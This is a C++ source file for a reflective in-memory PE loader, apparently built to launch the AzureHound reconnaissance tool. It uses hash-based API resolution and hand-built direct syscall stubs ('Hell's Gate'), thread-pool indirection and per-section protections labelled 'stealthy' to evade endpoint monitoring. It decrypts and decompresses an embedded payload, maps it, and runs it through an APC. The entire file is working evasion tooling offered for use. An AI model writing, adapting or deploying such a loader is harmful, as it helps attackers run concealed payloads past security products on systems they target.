// ============================================================================
// AzureHound Reflective Loader - Hell's Gate + Per-Section Permissions + Thread Pool
// ============================================================================
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <vector>
#include <cstdint>
#include <cstring>
#include <stdexcept>
#include <cstdio>
#include <zstd.h>
#include <openssl/evp.h>

// ----------------------------------------------------------------------------
// Debug output – comment out for release
// ----------------------------------------------------------------------------
#define DEBUG
#ifdef DEBUG
    #define DbgPrint(fmt, ...) printf(fmt, __VA_ARGS__)
#else
    #define DbgPrint(fmt, ...) ((void)0)
#endif

// ----------------------------------------------------------------------------
// Blob header
// ----------------------------------------------------------------------------
struct BlobHeader { char magic[4]; uint16_t version; uint8_t flags; uint8_t reserved[3]; };
#define BLOB_VERSION 1

// ----------------------------------------------------------------------------
// Hell's Gate helpers (FNV-1a hash, syscall number extraction, stub builder)
// ----------------------------------------------------------------------------
static uint32_t HashString(const char* str) {
    uint32_t hash = 0x811c9dc5;
    while (*str) {
        hash ^= (uint8_t)*str++;
        hash *= 0x01000193;
    }
    return hash;
}

static uint32_t ExtractSyscallNumber(FARPROC pFunc) {
    uint8_t* p = (uint8_t*)pFunc;
    // Debug print of stub bytes
    DbgPrint("[*] ExtractSyscallNumber: stub bytes: ");
    for (int i = 0; i < 32; i++) {
        DbgPrint("%02X ", p[i]);
    }
    DbgPrint("\n");
    // Search for syscall instruction (0F 05)
    for (int i = 0; i < 32; i++) {
        if (p[i] == 0x0F && p[i+1] == 0x05) {
            DbgPrint("[*] Found syscall at offset %d\n", i);
            for (int j = i-1; j >= i-16 && j >= 0; j--) {
                if (p[j] == 0xB8) {
                    uint32_t ssn = *(uint32_t*)(p + j + 1);
                    DbgPrint("[*] Found mov eax at offset %d, SSN = 0x%08X\n", j, ssn);
                    return ssn;
                }
            }
        }
    }
    DbgPrint("[!] Could not extract SSN from stub\n");
    return 0;
}

static FARPROC GetProcAddressByHash(HMODULE hMod, uint32_t hash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY exp = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!exp.Size) return nullptr;
    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod + exp.VirtualAddress);
    DWORD* names = (DWORD*)((BYTE*)hMod + pExp->AddressOfNames);
    WORD* ords  = (WORD*)((BYTE*)hMod + pExp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)hMod + pExp->AddressOfFunctions);
    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
        const char* name = (const char*)hMod + names[i];
        if (HashString(name) == hash) {
            return (FARPROC)((BYTE*)hMod + funcs[ords[i]]);
        }
    }
    return nullptr;
}

static void* CreateSyscallStub(uint32_t ssn) {
    uint8_t stub[] = {
        0x4C, 0x8B, 0xD1,                // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00,    // mov eax, SSN
        0x0F, 0x05,                      // syscall
        0xC3                             // ret
    };
    *(uint32_t*)(stub + 4) = ssn;
    void* p = VirtualAlloc(nullptr, sizeof(stub), MEM_COMMIT, PAGE_READWRITE);
    if (!p) return nullptr;
    memcpy(p, stub, sizeof(stub));
    DWORD old;
    VirtualProtect(p, sizeof(stub), PAGE_EXECUTE_READ, &old);
    return p;
}

// ----------------------------------------------------------------------------
// Syscall function types and global pointers
// ----------------------------------------------------------------------------
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemoryFunc)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* NtProtectVirtualMemoryFunc)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtWriteVirtualMemoryFunc)(HANDLE, PVOID, const void*, ULONG, PULONG);

static NtAllocateVirtualMemoryFunc pNtAlloc = nullptr;
static NtProtectVirtualMemoryFunc  pNtProt  = nullptr;
static NtWriteVirtualMemoryFunc    pNtWrite = nullptr;

// ----------------------------------------------------------------------------
// Initialize syscalls using Hell's Gate
// ----------------------------------------------------------------------------
static bool InitSyscalls() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        DbgPrint("[!] ntdll not loaded\n");
        return false;
    }

    static const uint32_t hashAlloc  = HashString("NtAllocateVirtualMemory");
    static const uint32_t hashProt   = HashString("NtProtectVirtualMemory");
    static const uint32_t hashWrite  = HashString("NtWriteVirtualMemory");

    FARPROC pAlloc = GetProcAddressByHash(hNtdll, hashAlloc);
    FARPROC pProt  = GetProcAddressByHash(hNtdll, hashProt);
    FARPROC pWrite = GetProcAddressByHash(hNtdll, hashWrite);

    DbgPrint("[*] pAlloc = %p, pProt = %p, pWrite = %p\n", pAlloc, pProt, pWrite);

    if (!pAlloc || !pProt || !pWrite) {
        DbgPrint("[!] Failed to resolve syscall addresses via Hell's Gate\n");
        return false;
    }

    uint32_t ssnAlloc = ExtractSyscallNumber(pAlloc);
    uint32_t ssnProt  = ExtractSyscallNumber(pProt);
    uint32_t ssnWrite = ExtractSyscallNumber(pWrite);

    DbgPrint("[*] ssnAlloc = 0x%X, ssnProt = 0x%X, ssnWrite = 0x%X\n",
             ssnAlloc, ssnProt, ssnWrite);

    if (!ssnAlloc || !ssnProt || !ssnWrite) {
        DbgPrint("[!] Failed to extract syscall numbers\n");
        return false;
    }

    DbgPrint("[+] Hell's Gate: SSNs -> Alloc=0x%X, Prot=0x%X, Write=0x%X\n",
             ssnAlloc, ssnProt, ssnWrite);

    pNtAlloc = (NtAllocateVirtualMemoryFunc)CreateSyscallStub(ssnAlloc);
    pNtProt  = (NtProtectVirtualMemoryFunc)CreateSyscallStub(ssnProt);
    pNtWrite = (NtWriteVirtualMemoryFunc)CreateSyscallStub(ssnWrite);

    if (!pNtAlloc || !pNtProt || !pNtWrite) {
        DbgPrint("[!] Failed to create syscall stubs\n");
        return false;
    }

    DbgPrint("[+] Syscall stubs created: Alloc=%p, Prot=%p, Write=%p\n",
             pNtAlloc, pNtProt, pNtWrite);
    return true;
}

// ----------------------------------------------------------------------------
// Memory helpers (prefer syscalls, fallback to Win32)
// These will be called from thread pool workers
// ----------------------------------------------------------------------------
static void* SysAlloc(SIZE_T size) {
    if (pNtAlloc) {
        PVOID base = nullptr;
        SIZE_T sz = size;
        if (NT_SUCCESS(pNtAlloc(GetCurrentProcess(), &base, 0, &sz,
                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
            return base;
    }
    return VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}

static bool SysProtect(void* addr, SIZE_T size, DWORD prot) {
    if (pNtProt) {
        SIZE_T sz = size;
        ULONG old = 0;
        if (NT_SUCCESS(pNtProt(GetCurrentProcess(), &addr, &sz, prot, &old)))
            return true;
    }
    DWORD old;
    return VirtualProtect(addr, size, prot, &old);
}

static bool SysWrite(void* dst, const void* src, SIZE_T size) {
    if (pNtWrite) {
        ULONG written = 0;
        if (NT_SUCCESS(pNtWrite(GetCurrentProcess(), dst, src, (ULONG)size, &written)))
            return true;
    }
    DWORD old;
    if (!VirtualProtect(dst, size, PAGE_READWRITE, &old)) return false;
    memcpy(dst, src, size);
    VirtualProtect(dst, size, old, &old);
    return true;
}


// ----------------------------------------------------------------------------
// Thread Pool wrappers (corrected with event signaling)
// ----------------------------------------------------------------------------
struct AllocArgs {
    SIZE_T size;
    void* result;
    HANDLE done;
};


static DWORD WINAPI AllocProc(void* param) {
    AllocArgs* args = (AllocArgs*)param;
    DbgPrint("[*] AllocProc: about to call SysAlloc\n");
    args->result = SysAlloc(args->size);
    DbgPrint("[*] AllocProc: SysAlloc returned %p\n", args->result);
    SetEvent(args->done);   // <-- THIS WAS MISSING
    return 0;
}

static void* SysAllocTP(SIZE_T size) {
    HANDLE done = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (!done) {
        DbgPrint("[!] CreateEvent failed for Alloc\n");
        return nullptr;
    }
    AllocArgs args = { size, nullptr, done };
    if (!QueueUserWorkItem(AllocProc, &args, WT_EXECUTEDEFAULT)) {
        DbgPrint("[!] QueueUserWorkItem failed for Alloc\n");
        CloseHandle(done);
        return nullptr;
    }
    DbgPrint("[*] Waiting for Alloc work item...\n");
    WaitForSingleObject(done, INFINITE);
    DbgPrint("[*] Alloc work item completed\n");
    CloseHandle(done);
    return args.result;
}


// ----------------------------------------------------------------------------
struct ProtectArgs {
    void* addr;
    SIZE_T size;
    DWORD prot;
    bool result;
    HANDLE done;
};

static DWORD WINAPI ProtectProc(void* param) {
    ProtectArgs* args = (ProtectArgs*)param;
    DbgPrint("[*] ProtectProc: about to call SysProtect\n");
    args->result = SysProtect(args->addr, args->size, args->prot);
    DbgPrint("[*] ProtectProc: SysProtect returned %d\n", args->result);
    SetEvent(args->done);   // <-- THIS WAS MISSING
    return 0;
}

static bool SysProtectTP(void* addr, SIZE_T size, DWORD prot) {
    HANDLE done = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (!done) {
        DbgPrint("[!] CreateEvent failed for Protect\n");
        return false;
    }
    ProtectArgs args = { addr, size, prot, false, done };
    if (!QueueUserWorkItem(ProtectProc, &args, WT_EXECUTEDEFAULT)) {
        DbgPrint("[!] QueueUserWorkItem failed for Protect\n");
        CloseHandle(done);
        return false;
    }
    DbgPrint("[*] Waiting for Protect work item...\n");
    WaitForSingleObject(done, INFINITE);
    DbgPrint("[*] Protect work item completed\n");
    CloseHandle(done);
    return args.result;
}

// ----------------------------------------------------------------------------
struct WriteArgs {
    void* dst;
    const void* src;
    SIZE_T size;
    bool result;
    HANDLE done;
};

static DWORD WINAPI WriteProc(void* param) {
    WriteArgs* args = (WriteArgs*)param;
    DbgPrint("[*] WriteProc: about to call SysWrite\n");
    args->result = SysWrite(args->dst, args->src, args->size);
    DbgPrint("[*] WriteProc: SysWrite returned %d\n", args->result);
    SetEvent(args->done);   // <-- THIS WAS MISSING
    return 0;
}

static bool SysWriteTP(void* dst, const void* src, SIZE_T size) {
    HANDLE done = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (!done) {
        DbgPrint("[!] CreateEvent failed for Write\n");
        return false;
    }
    WriteArgs args = { dst, src, size, false, done };
    if (!QueueUserWorkItem(WriteProc, &args, WT_EXECUTEDEFAULT)) {
        DbgPrint("[!] QueueUserWorkItem failed for Write\n");
        CloseHandle(done);
        return false;
    }
    DbgPrint("[*] Waiting for Write work item...\n");
    WaitForSingleObject(done, INFINITE);
    DbgPrint("[*] Write work item completed\n");
    CloseHandle(done);
    return args.result;
}


// ----------------------------------------------------------------------------
// Global mapped base
// ----------------------------------------------------------------------------
static void* g_mappedBase = nullptr;

// ----------------------------------------------------------------------------
// Image protection (toggling RW / RX for whole image)
// ----------------------------------------------------------------------------
static bool SetImageProtection(DWORD prot) {
    if (!g_mappedBase) return false;
    BYTE* base = (BYTE*)g_mappedBase;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    DWORD size = nt->OptionalHeader.SizeOfImage;
    const char* protName = (prot == PAGE_READWRITE) ? "RW" :
                           (prot == PAGE_EXECUTE_READ) ? "RX" : "other";
    bool ok = SysProtectTP(base, size, prot);  // <- thread pool version
    if (ok) DbgPrint("[+] Image protection set to %s\n", protName);
    else DbgPrint("[!] Failed to set protection to %s\n", protName);
    return ok;
}

// ----------------------------------------------------------------------------
// PE mapping
// ----------------------------------------------------------------------------
static bool MapPE(const uint8_t* data, SIZE_T len) {
    DbgPrint("[*] MapPE: parsing headers...\n");
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)data;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { DbgPrint("[!] Invalid DOS header\n"); return false; }
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(data + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) { DbgPrint("[!] Invalid NT header\n"); return false; }
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) { DbgPrint("[!] Not x64 PE\n"); return false; }

    DWORD imageSize = nt->OptionalHeader.SizeOfImage;
    DbgPrint("[*] Image size: 0x%X bytes\n", imageSize);
    void* base = SysAllocTP(imageSize);  // <- thread pool version
    if (!base) { DbgPrint("[!] Allocation failed\n"); return false; }
    g_mappedBase = base;
    DbgPrint("[+] Mapped base: %p\n", base);

    memcpy(base, data, nt->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER sect = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sect[i].Misc.VirtualSize && sect[i].PointerToRawData && sect[i].SizeOfRawData) {
            if (!SysWriteTP((BYTE*)base + sect[i].VirtualAddress,
                           data + sect[i].PointerToRawData,
                           sect[i].SizeOfRawData)) {  // <- thread pool version
                DbgPrint("[!] Failed to write section %d\n", i);
            }
        }
    }
    DbgPrint("[*] PE sections copied\n");

    // Initially set to RX (no RWX)
    if (!SetImageProtection(PAGE_EXECUTE_READ)) return false;
    DbgPrint("[+] MapPE: success\n");
    return true;
}

// ----------------------------------------------------------------------------
// Apply relocations (temporarily makes image writable)
// ----------------------------------------------------------------------------
static bool ApplyRelocations() {
    DbgPrint("[*] ApplyRelocations: start\n");
    if (!g_mappedBase) return false;
    BYTE* base = (BYTE*)g_mappedBase;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    if (!rva) { DbgPrint("[*] No relocations present\n"); return true; }
    ULONGLONG delta = (ULONGLONG)base - nt->OptionalHeader.ImageBase;
    if (!delta) { DbgPrint("[*] No delta (loaded at preferred base)\n"); return true; }
    DbgPrint("[*] Delta: 0x%llX\n", delta);

    if (!SetImageProtection(PAGE_READWRITE)) {
        DbgPrint("[!] Failed to make image writable for relocations\n");
        return false;
    }

    PIMAGE_BASE_RELOCATION rel = (PIMAGE_BASE_RELOCATION)(base + rva);
    while (rel->VirtualAddress) {
        DWORD count = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* items = (WORD*)(rel + 1);
        for (DWORD i = 0; i < count; i++) {
            if ((items[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                ULONGLONG* addr = (ULONGLONG*)(base + rel->VirtualAddress + (items[i] & 0xFFF));
                *addr += delta;
            }
        }
        rel = (PIMAGE_BASE_RELOCATION)((BYTE*)rel + rel->SizeOfBlock);
    }

    if (!SetImageProtection(PAGE_EXECUTE_READ)) {
        DbgPrint("[!] Failed to restore RX after relocations\n");
        return false;
    }
    DbgPrint("[+] Relocations applied\n");
    return true;
}

// ----------------------------------------------------------------------------
// Resolve imports (temporarily makes image writable)
// ----------------------------------------------------------------------------
static bool ResolveImports() {
    DbgPrint("[*] ResolveImports: start\n");
    if (!g_mappedBase) return false;
    BYTE* base = (BYTE*)g_mappedBase;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (!rva) { DbgPrint("[*] No imports\n"); return true; }

    if (!SetImageProtection(PAGE_READWRITE)) {
        DbgPrint("[!] Failed to make image writable for imports\n");
        return false;
    }

    PIMAGE_IMPORT_DESCRIPTOR desc = (PIMAGE_IMPORT_DESCRIPTOR)(base + rva);
    while (desc->Name) {
        const char* dll = (const char*)(base + desc->Name);
        DbgPrint("[*] Loading DLL: %s\n", dll);
        HMODULE h = LoadLibraryA(dll);
        if (h) {
            PIMAGE_THUNK_DATA orig = (PIMAGE_THUNK_DATA)(base + (desc->OriginalFirstThunk ? desc->OriginalFirstThunk : desc->FirstThunk));
            PIMAGE_THUNK_DATA iat  = (PIMAGE_THUNK_DATA)(base + desc->FirstThunk);
            int count = 0;
            while (orig->u1.Ordinal) {
                FARPROC func = nullptr;
                if (!(orig->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
                    PIMAGE_IMPORT_BY_NAME name = (PIMAGE_IMPORT_BY_NAME)(base + orig->u1.Ordinal);
                    func = GetProcAddress(h, name->Name);
                } else {
                    func = GetProcAddress(h, (LPCSTR)(orig->u1.Ordinal & ~IMAGE_ORDINAL_FLAG));
                }
                iat->u1.Function = (ULONGLONG)func;
                orig++; iat++;
                count++;
            }
            DbgPrint("[+] Resolved %d functions from %s\n", count, dll);
        } else {
            DbgPrint("[!] Failed to load %s\n", dll);
        }
        desc++;
    }

    if (!SetImageProtection(PAGE_EXECUTE_READ)) {
        DbgPrint("[!] Failed to restore RX after imports\n");
        return false;
    }
    DbgPrint("[+] Imports resolved\n");
    return true;
}

// ----------------------------------------------------------------------------
// TLS callbacks (if present)
// ----------------------------------------------------------------------------
static bool InitTLS() {
    DbgPrint("[*] InitTLS: start\n");
    if (!g_mappedBase) return false;
    BYTE* base = (BYTE*)g_mappedBase;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    if (!rva) { DbgPrint("[*] No TLS directory\n"); return true; }
    PIMAGE_TLS_DIRECTORY tls = (PIMAGE_TLS_DIRECTORY)(base + rva);
    DWORD imgSize = nt->OptionalHeader.SizeOfImage;
    if (tls->AddressOfCallBacks == 0 || tls->AddressOfCallBacks >= imgSize) {
        DbgPrint("[*] TLS callbacks invalid, skipping\n");
        return true;
    }
    PIMAGE_TLS_CALLBACK* cb = (PIMAGE_TLS_CALLBACK*)(base + tls->AddressOfCallBacks);
    while (*cb) {
        DbgPrint("[*] Executing TLS callback at %p\n", *cb);
        (*cb)((PVOID)GetModuleHandle(NULL), DLL_PROCESS_ATTACH, NULL);
        cb++;
    }
    DbgPrint("[+] TLS callbacks executed\n");
    return true;
}

// ----------------------------------------------------------------------------
// Apply per-section permissions (stealthy)
// ----------------------------------------------------------------------------
static bool ApplySectionProtections() {
    if (!g_mappedBase) return false;
    BYTE* base = (BYTE*)g_mappedBase;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sect = IMAGE_FIRST_SECTION(nt);

    DbgPrint("[*] Applying per-section protections...\n");
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD addr = sect[i].VirtualAddress;
        DWORD size = sect[i].Misc.VirtualSize;
        if (size == 0) continue;

        DWORD prot = 0;
        DWORD charFlags = sect[i].Characteristics;

        if (charFlags & IMAGE_SCN_MEM_EXECUTE) {
            prot = PAGE_EXECUTE_READ;
        } else {
            prot = PAGE_READONLY;
        }

        if (charFlags & IMAGE_SCN_MEM_WRITE) {
            if (prot & PAGE_EXECUTE_READ) prot = PAGE_EXECUTE_READWRITE;
            else prot = PAGE_READWRITE;
        }

        if (!SysProtectTP(base + addr, size, prot)) {
            DbgPrint("[!] Failed to protect section %d (VA=0x%X) with 0x%X\n", i, addr, prot);
            return false;
        }
        DbgPrint("[*] Section %d: VA=0x%X, size=0x%X, flags=0x%X -> prot=0x%X\n",
                 i, addr, size, charFlags, prot);
    }
    DbgPrint("[+] Per-section protections applied\n");
    return true;
}

// ----------------------------------------------------------------------------
// Get entry point address
// ----------------------------------------------------------------------------
static void* GetEntryPoint() {
    if (!g_mappedBase) return nullptr;
    BYTE* base = (BYTE*)g_mappedBase;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    return (void*)(base + nt->OptionalHeader.AddressOfEntryPoint);
}

// ----------------------------------------------------------------------------
// APC callback
// ----------------------------------------------------------------------------
VOID NTAPI PayloadAPC(ULONG_PTR) {
    DbgPrint("[*] APC triggered, calling payload entry point...\n");
    void* ep = GetEntryPoint();
    if (ep) {
        ((int(*)())ep)();
    } else {
        DbgPrint("[!] APC: entry point is NULL\n");
    }
}

// ----------------------------------------------------------------------------
// Decryption and decompression
// ----------------------------------------------------------------------------
static std::vector<uint8_t> decryptData(const uint8_t* enc, size_t encLen, const uint8_t key[32]) {
    DbgPrint("[*] Decrypting: %zu bytes\n", encLen);
    const size_t nonce_size = 12, tag_size = 16;
    if (encLen < nonce_size + tag_size) throw std::runtime_error("Too small");
    size_t cipherLen = encLen - nonce_size - tag_size;

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) throw std::runtime_error("EVP ctx");

    EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, nonce_size, nullptr);
    EVP_DecryptInit_ex(ctx, nullptr, nullptr, key, enc);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, tag_size, (void*)(enc + nonce_size));

    std::vector<uint8_t> plain(cipherLen);
    int len1, len2;
    EVP_DecryptUpdate(ctx, plain.data(), &len1, enc + nonce_size + tag_size, cipherLen);
    EVP_DecryptFinal_ex(ctx, plain.data() + len1, &len2);
    EVP_CIPHER_CTX_free(ctx);
    plain.resize(len1 + len2);
    DbgPrint("[+] Decrypted: %zu bytes\n", plain.size());
    return plain;
}

static std::vector<uint8_t> decompressData(const std::vector<uint8_t>& comp) {
    DbgPrint("[*] Decompressing: %zu bytes\n", comp.size());
    size_t outSize = ZSTD_getFrameContentSize(comp.data(), comp.size());
    if (outSize == ZSTD_CONTENTSIZE_ERROR || outSize == ZSTD_CONTENTSIZE_UNKNOWN)
        throw std::runtime_error("ZSTD invalid size");
    std::vector<uint8_t> decomp(outSize);
    size_t result = ZSTD_decompress(decomp.data(), decomp.size(), comp.data(), comp.size());
    if (ZSTD_isError(result)) throw std::runtime_error(ZSTD_getErrorName(result));
    decomp.resize(result);
    DbgPrint("[+] Decompressed: %zu bytes\n", decomp.size());
    return decomp;
}

// ----------------------------------------------------------------------------
// Main entry
// ----------------------------------------------------------------------------
extern "C" int __cdecl main(int argc, char* argv[]) {
    DbgPrint("================================================================\n");
    DbgPrint(" AzureHound Reflective Loader - Hell's Gate + Thread Pool\n");
    DbgPrint("================================================================\n");

    // Init syscalls (Hell's Gate)
    if (!InitSyscalls()) {
        DbgPrint("[!] Hell's Gate failed, falling back to Win32 APIs\n");
        pNtAlloc = nullptr;
	pNtProt  = nullptr;
	pNtWrite = nullptr;
    }

    // Load resource
    DbgPrint("[*] Loading resource...\n");
    HMODULE self = GetModuleHandle(NULL);
    HRSRC res = FindResource(self, MAKEINTRESOURCE(1), RT_RCDATA);
    if (!res) {
        DbgPrint("[!] FindResource failed\n");
        return 1;
    }
    DWORD sz = SizeofResource(self, res);
    HGLOBAL mem = LoadResource(self, res);
    if (!mem) {
        DbgPrint("[!] LoadResource failed\n");
        return 1;
    }
    const uint8_t* blob = (const uint8_t*)LockResource(mem);
    if (!blob) {
        DbgPrint("[!] LockResource failed\n");
        return 1;
    }
    DbgPrint("[+] Resource loaded, size: %lu bytes\n", sz);

    // Parse header
    BlobHeader hdr;
    memcpy(&hdr, blob, sizeof(hdr));
    if (memcmp(hdr.magic, "AHBL", 4) != 0 || hdr.version != BLOB_VERSION) {
        DbgPrint("[!] Invalid blob header (magic=%.4s, version=%d)\n", hdr.magic, hdr.version);
        return 1;
    }
    DbgPrint("[+] Blob header valid (version %d)\n", hdr.version);

    const uint8_t* enc = blob + sizeof(hdr);
    size_t encLen = sz - sizeof(hdr);
    DbgPrint("[*] Encrypted size: %zu bytes\n", encLen);

    // Key – must match BlobPrep
    static const uint8_t key[32] = {
        'A','z','u','r','e','H','o','u','n','d','L','o','a','d','e','r',
        'S','e','c','r','e','t','K','e','y','1','2','3','4','5','6','7'
    };

    // Decrypt
    std::vector<uint8_t> plain;
    try {
        plain = decryptData(enc, encLen, key);
    } catch (const std::exception& e) {
        DbgPrint("[!] Decryption error: %s\n", e.what());
        return 1;
    } catch (...) {
        DbgPrint("[!] Decryption unknown error\n");
        return 1;
    }

    // Decompress
    std::vector<uint8_t> decomp;
    try {
        decomp = decompressData(plain);
    } catch (const std::exception& e) {
        DbgPrint("[!] Decompression error: %s\n", e.what());
        return 1;
    } catch (...) {
        DbgPrint("[!] Decompression unknown error\n");
        return 1;
    }

    // Map PE
    DbgPrint("[*] Mapping PE...\n");
    if (!MapPE(decomp.data(), decomp.size())) {
        DbgPrint("[!] MapPE failed\n");
        return 1;
    }

    // Apply relocations
    DbgPrint("[*] Applying relocations...\n");
    if (!ApplyRelocations()) {
        DbgPrint("[!] ApplyRelocations failed\n");
        return 1;
    }

    // Resolve imports
    DbgPrint("[*] Resolving imports...\n");
    if (!ResolveImports()) {
        DbgPrint("[!] ResolveImports failed\n");
        return 1;
    }

    // TLS
    DbgPrint("[*] Initializing TLS...\n");
    if (!InitTLS()) {
        DbgPrint("[!] InitTLS failed\n");
        return 1;
    }

    // Apply per-section permissions (stealthy)
    if (!ApplySectionProtections()) {
        DbgPrint("[!] ApplySectionProtections failed\n");
        return 1;
    }

    DbgPrint("[*] All preparations done, launching payload...\n");

    // Queue APC and wait
    HANDLE hThread = GetCurrentThread();
    if (QueueUserAPC((PAPCFUNC)PayloadAPC, hThread, 0)) {
        DbgPrint("[+] APC queued, entering alertable wait...\n");
        SleepEx(INFINITE, TRUE);
        DbgPrint("[*] APC returned (should not happen)\n");
    } else {
        DbgPrint("[!] QueueUserAPC failed, falling back to direct call\n");
        void* ep = GetEntryPoint();
        if (ep) {
            DbgPrint("[*] Calling entry point directly at %p\n", ep);
            ((int(*)())ep)();
        } else {
            DbgPrint("[!] Entry point is NULL\n");
            return 1;
        }
    }

    DbgPrint("[+] Loader completed successfully\n");
    return 0;
}